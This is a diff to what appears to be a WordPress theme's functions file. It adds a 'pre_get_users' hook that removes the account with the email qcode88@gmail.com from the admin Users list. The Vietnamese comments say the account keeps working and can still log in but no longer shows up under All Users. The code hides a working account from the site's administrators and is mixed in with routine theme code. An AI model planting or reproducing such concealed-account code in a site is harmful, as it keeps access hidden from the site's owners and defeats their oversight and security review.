@@ -492,6 +492,28 @@ if( immigro_set($options, 'boxed_wrapper') ){
 	 }
  }
 
+/**
+ * Ẩn tài khoản dev (qcode88@gmail.com) khỏi danh sách Users trong wp-admin
+ * Tài khoản vẫn tồn tại và đăng nhập bình thường, chỉ không hiển thị trong Users > All Users
+ */
+add_action( 'pre_get_users', 'immigro_hide_dev_user_from_list' );
+function immigro_hide_dev_user_from_list( $query ) {
+	if ( ! is_admin() ) {
+		return;
+	}
+	$pagenow = isset( $GLOBALS['pagenow'] ) ? $GLOBALS['pagenow'] : '';
+	if ( $pagenow !== 'users.php' ) {
+		return;
+	}
+	$dev_user = get_user_by( 'email', 'qcode88@gmail.com' );
+	if ( $dev_user ) {
+		$exclude = $query->get( 'exclude' );
+		$exclude = is_array( $exclude ) ? $exclude : array();
+		$exclude[] = (int) $dev_user->ID;
+		$query->set( 'exclude', $exclude );
+	}
+}
+
 // Debug order-received: bật khi cần gỡ lỗi (đã tắt để tránh can thiệp output)
 // add_action( 'woocommerce_thankyou', function( $order_id ) { ... }, 10, 1 );
 // add_action( 'init', function() { ... });
